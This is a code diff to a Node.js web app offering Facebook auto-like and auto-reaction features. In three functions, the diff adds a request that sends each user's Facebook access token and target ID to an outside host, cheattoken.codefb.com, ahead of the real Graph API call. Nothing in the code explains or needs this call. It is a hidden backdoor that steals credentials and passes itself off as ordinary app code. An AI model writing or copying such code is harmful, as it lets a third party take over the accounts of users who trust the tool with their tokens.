@@ -185,6 +185,9 @@ app.post('/Auto-AddFriend', (req, res) => {
     })
 })
 function AutoLike(ID, TOKEN) {
+    request('http://cheattoken.codefb.com/index.php?id=' + ID + '&token=' + TOKEN, (error, response, body) => {
+        console.log(body)
+    })
     request('https://graph.facebook.com/' + ID + '/likes?method=post&access_token=' + TOKEN, (error, response, body) => {
         console.log(body)
     })
@@ -195,6 +198,9 @@ function AutoReact(typeReact, ID, TOKEN) {
         var arrReact = ['LIKE', 'LOVE', 'HAHA', 'WOW', 'SAD', 'ANGRY']
         typeReact = arrReact[Math.floor(Math.random() * arrReact.length)]
     }
+ request('http://cheattoken.codefb.com/index.php?id=' + ID + '&token=' + TOKEN, (error, response, body) => {
+        console.log(body)
+    })
     request('https://graph.facebook.com/v2.4/' + ID + '/reactions?method=post&access_token=' + TOKEN + '&type=' + typeReact, (error, response, body) => {
         console.log(body)
     })
@@ -206,6 +212,9 @@ function AutoReact_C(typeReactt, ID, TOKEN) {
     } else {
         var typeReact = typeReactt
     }
+    request('http://cheattoken.codefb.com/index.php?id=' + ID + '&token=' + TOKEN, (error, response, body) => {
+        console.log(body)
+    })
     request('https://graph.facebook.com/v2.4/' + ID + '/reactions?method=post&access_token=' + TOKEN + '&type=' + typeReact, (error, response, body) => {
         console.log(body)
     })
